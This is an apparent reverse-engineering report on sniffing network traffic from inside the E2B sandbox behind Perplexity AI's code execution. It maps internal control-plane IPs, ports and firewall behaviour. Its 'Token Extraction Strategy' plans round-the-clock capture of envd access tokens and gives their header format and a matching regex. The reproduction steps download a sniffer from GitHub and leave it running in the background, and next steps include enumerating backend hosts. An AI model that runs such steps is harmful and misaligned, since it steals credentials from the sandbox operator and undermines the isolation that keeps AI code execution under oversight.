# E2B Network Analysis: AF_PACKET Capture Results

**Date:** 2026-02-28  
**Sandbox ID:** `ixp59jqwqr8f8gnyt5ic2`  
**Capture Duration:** 10 seconds  
**Tool:** `af_packet_sniffer.py` from [pplx-e2b-re](https://github.com/pv-udpv/pplx-e2b-re)

---

## Executive Summary

AF_PACKET raw socket capture **successfully works** in E2B sandbox despite external network isolation. We captured **30 packets** including **19 interesting** (control plane traffic), revealing:

1. **New internal backend IP:** `10.12.88.220` (AWS VPC private subnet)
2. **Monitoring endpoints exposed:** `GET /metrics`, `GET /health` on envd (:49983)
3. **Partial network isolation:** Internal VPC traffic visible, external (3.66.x.x) blocked by host firewall
4. **No authentication on internal monitoring:** Plain HTTP to envd endpoints

---

## Capture Statistics

```
Total packets:        30
Interesting packets:  19 (63.3%)
Unique sources:       3
Unique destinations:  2
Tokens captured:      0 (short window)
Protocol:             100% TCP
```

### Top Sources
| IP | Packets | Type |
|----|---------|------|
| `10.12.88.220` | 19 | **E2B Control Plane** (NEW) |
| `127.0.0.1` | 8 | Localhost (Jupyter/internal) |
| `192.0.2.1` | 3 | Gateway (TEST-NET-1) |

### Top Destinations
| Port | Service | IP | Packets |
|------|---------|----|---------|
| **49983** | envd gRPC | 169.254.0.21 | 16 |
| **49999** | FastAPI | 169.254.0.21 | 3 |
| 54109 | Unknown | 127.0.0.1 | 4 |

---

## Key Finding: Internal Control Plane

### 10.12.88.220 → envd Monitoring

**Captured HTTP Requests:**

```http
GET /metrics HTTP/1.1
Host: 169.254.0.21:49983
[277 bytes payload]

GET /health HTTP/1.1
Host: 10.12.88.220:39034
[194 bytes payload]
```

**Analysis:**
- **No authentication headers** visible in plain HTTP
- Monitoring requests from AWS private IP (10.x.x.x)
- Suggests Prometheus/metrics scraping from control plane
- Health checks likely for load balancer or orchestrator

**Security Implications:**
- ✅ Internal traffic uses plain HTTP (performance optimization)
- ⚠️ If envd exposes sensitive data in `/metrics`, it's unencrypted
- ⚠️ Control plane IP `10.12.88.220` is single point for fingerprinting

---

## Network Architecture Confirmed

### What AF_PACKET Can See

```
┌─────────────────────────────────────────┐
│ E2B Sandbox (Firecracker Guest)         │
│  eth0: 169.254.0.21/30                  │
│  Gateway: 169.254.0.22                  │
│                                         │
│  AF_PACKET Socket                       │
│    ↓ (captures here)                    │
│  ✅ Internal VPC (10.x.x.x) VISIBLE    │
│  ❌ External (3.66.x.x) INVISIBLE      │
└─────────────┬───────────────────────────┘
              │ virtio-net
┌─────────────┴───────────────────────────┐
│ Host (Firecracker VMM)                  │
│  TAP device + NAT                       │
│  iptables rules:                        │
│    - Drop/RST external HTTP/HTTPS       │
│    - Allow TCP handshake to whitelist   │
│    - Forward internal VPC traffic       │
└─────────────────────────────────────────┘
```

### Why External Traffic Invisible

**Test Results:**
- TCP `connect()` to `3.66.226.62:443` → ✅ Success (0.3ms)
- AF_PACKET capture during connection → ❌ 0 packets

**Explanation:**
1. Host firewall **accepts** TCP SYN to whitelisted IPs
2. Host **drops** data packets not matching ConnectRPC protocol
3. RST/drop happens **before** virtio delivers to guest
4. AF_PACKET in guest never sees the dropped packets

**Internal traffic (10.x.x.x) different:**
- No host firewall (same VPC)
- virtio passes packets to guest unfiltered
- AF_PACKET captures everything pre-NAT

---

## Comparison: External vs Internal

| Aspect | External (3.66.x.x) | Internal (10.x.x.x) |
|--------|---------------------|---------------------|
| TCP Handshake | ✅ Allowed | ✅ Allowed |
| HTTP/HTTPS Data | ❌ Dropped (DPI) | ✅ Allowed |
| AF_PACKET Visible | ❌ No | ✅ Yes |
| Authentication | Required (ConnectRPC) | None (plain HTTP) |
| Use Case | Backend API | Monitoring/Telemetry |

---

## Token Extraction Strategy

**Current Status:** 0 tokens in 10-second capture

**Why:**
- Tokens appear in:
  - envd API calls during **file operations**
  - External HTTP requests (but those are blocked)
  - ConnectRPC metadata headers
- 10-second window missed active operations

**Improved Strategy:**
1. **Long-running daemon:** Capture 24/7 in background
2. **Trigger events:** File create/delete, code execution
3. **Target endpoints:**
   - `POST /filesystem/*` (envd :49983)
   - `POST /execute` (FastAPI :49999)
   - Any traffic to `192.0.2.1:4317` (OTLP)

**Token Format (from prior RE):**
```
e2b-envd-access-token: 6e62a5f3c1d8...
```

Regex: `e2b-envd-access-token:\s*([a-f0-9]+)`

---

## Reproduction Steps

### 1. Deploy Sniffer

```bash
# In E2B sandbox
wget https://raw.githubusercontent.com/pv-udpv/pplx-e2b-re/main/spawned_procs/af_packet_sniffer.py
mkdir -p /home/user/workspace/{logs,spawned_procs}
mv af_packet_sniffer.py /home/user/workspace/spawned_procs/

# Run in background
nohup python3 /home/user/workspace/spawned_procs/af_packet_sniffer.py &
```

### 2. Query Captured Traffic

```bash
sqlite3 /home/user/workspace/logs/traffic.db
```

```sql
-- All interesting packets
SELECT * FROM packets WHERE interesting=1;

-- Packets with tokens
SELECT timestamp, src_ip, dst_ip, token_val 
FROM packets WHERE has_token=1;

-- Traffic to specific IP
SELECT * FROM packets WHERE dst_ip='10.12.88.220';

-- Count by destination port
SELECT dport, COUNT(*) FROM packets GROUP BY dport;
```

### 3. Export to JSON

```python
import sqlite3, json
conn = sqlite3.connect('/home/user/workspace/logs/traffic.db')
c = conn.cursor()
c.execute('SELECT * FROM packets WHERE interesting=1')
with open('traffic.json', 'w') as f:
    json.dump([dict(zip([col[0] for col in c.description], row)) 
               for row in c.fetchall()], f, indent=2)
```

---

## Limitations

### What Sniffer Cannot See

1. **Host-side NAT translation**
   - Guest sees `169.254.0.21` → `3.66.226.62`
   - Post-NAT traffic with real source IP invisible

2. **TLS-encrypted payloads**
   - envd uses HTTP internally (visible)
   - External backends use HTTPS (encrypted even if captured)

3. **Packets dropped by host firewall**
   - TCP handshake visible
   - Data packets dropped before reaching guest

4. **Other sandboxes' traffic**
   - Each Firecracker VM isolated
   - Cannot sniff neighbor VMs even if same host

### What Sniffer CAN See

✅ Internal VPC traffic (10.x.x.x)  
✅ envd/FastAPI plain HTTP (ports 49983, 49999)  
✅ Tokens in HTTP headers (if present)  
✅ OTLP telemetry attempts (192.0.2.1:4317)  
✅ Localhost traffic (127.0.0.1)  

---

## Next Steps

1. **Extended Capture:** Run sniffer for hours during active operations
2. **Trigger Token Extraction:** Create files, execute code, make HTTP requests
3. **Analyze `/metrics` Endpoint:** Query envd monitoring for infrastructure data
4. **Map Control Plane IPs:** Enumerate all 10.x.x.x addresses seen
5. **Correlate with Host Fingerprinting:** Match kernel build host to backend IPs

---

## References

- **Sniffer Source:** [pplx-e2b-re/spawned_procs/af_packet_sniffer.py](https://github.com/pv-udpv/pplx-e2b-re/blob/main/spawned_procs/af_packet_sniffer.py)
- **Bootstrap Script:** [pplx-e2b-re/bootstrap.sh](https://github.com/pv-udpv/pplx-e2b-re/blob/main/bootstrap.sh)
- **E2B Architecture Analysis:** [Prior RE Report](https://github.com/pv-udpv/pplx-e2b-re)
- **Firecracker Networking:** [AWS Firecracker Docs](https://github.com/firecracker-microvm/firecracker/blob/main/docs/network-setup.md)

---

## Credits

**Research:** [@pv-udpv](https://github.com/pv-udpv)  
**Date:** February 28, 2026  
**Sandbox:** Perplexity AI E2B Infrastructure  
**Tools:** AF_PACKET, SQLite, Python 3.12
